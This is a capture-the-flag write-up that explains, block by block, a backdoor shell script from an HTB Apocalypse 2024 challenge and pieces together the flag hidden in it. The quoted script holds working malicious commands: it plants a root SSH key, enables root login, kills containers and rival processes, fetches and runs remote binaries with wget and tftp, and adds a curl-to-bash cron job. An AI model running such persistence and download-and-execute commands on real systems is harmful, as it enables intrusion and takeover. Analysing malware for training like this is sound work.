---
layout: default
title: An Unusual Sighting
parent: HTB Apocalypse 2024
nav_order: 2
---

This challenge provides just a single bash script. Taking a quick look at this script, it appears to be a targeted backdoor for a single system. More specifically, it does tha following:

It starts with a shebang(`#!`) which allows it to be run with `./script.sh` instead of `/bin/sh script.sh`

```
#!/bin/sh
```

Next, it makes sure that the name of the machine is "KORP-STATION-013" before continuing

```
if [ "$HOSTNAME" != "KORP-STATION-013" ]; then
    exit
fi
```

It also ensures that the effective user ID (what programs are run as) is root

```
if [ "$EUID" -ne 0 ]; then
    exit
fi
```

Next, it gets the container ID of all running containers and stops them before removing all containers.

```
docker kill $(docker ps -q)
docker rm $(docker ps -a -q)
```

The following chunk does a couple things to set up the machine for a backdoor. It starts by adding a key that can be used for ssh access from a user on tS_u0y_ll1w{BTH (the first part of the flag reversed). After that, it makes sure it's resolving domain names using Google's DNS. Then, it allows a user to login as root over ssh, lastly, it adds a local DNS resolution for legions.korp.htb.

```
echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "128.90.59.19 legions.korp.htb" >> /etc/hosts
```

Next, the script looks for a list of running programs, and kills any program that matches an entry on that list.

```
for filename in /proc/*; do
    ex=$(ls -latrh $filename 2> /dev/null|grep exe)
    if echo $ex |grep -q "/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew"; then
        result=$(echo "$filename" | sed "s/\/proc\///")
        kill -9 $result
        echo found $filename $result
    fi
done
```

Next to last, it ensures that the architecture of the system is one of x86, x86_64, mips, aarch64, or arm.

```
ARCH=$(uname -m)
array=("x86" "x86_64" "mips" "aarch64" "arm")

if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then
  exit
fi
```

Lastly, it locates a directory it can access, downloads a variety of scripts, runs them, and adds a cron job to run one every 5 minutes. In the cron job, it also has a base64 encoded part of the flag (4nd_y0uR_Gr0uNd!!})

```
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH; 
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH;
echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c 'NG5kX3kwdVJfR3IwdU5kISF9' " >> /etc/crontab
```

Combining the two parts of the found flag gets: HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}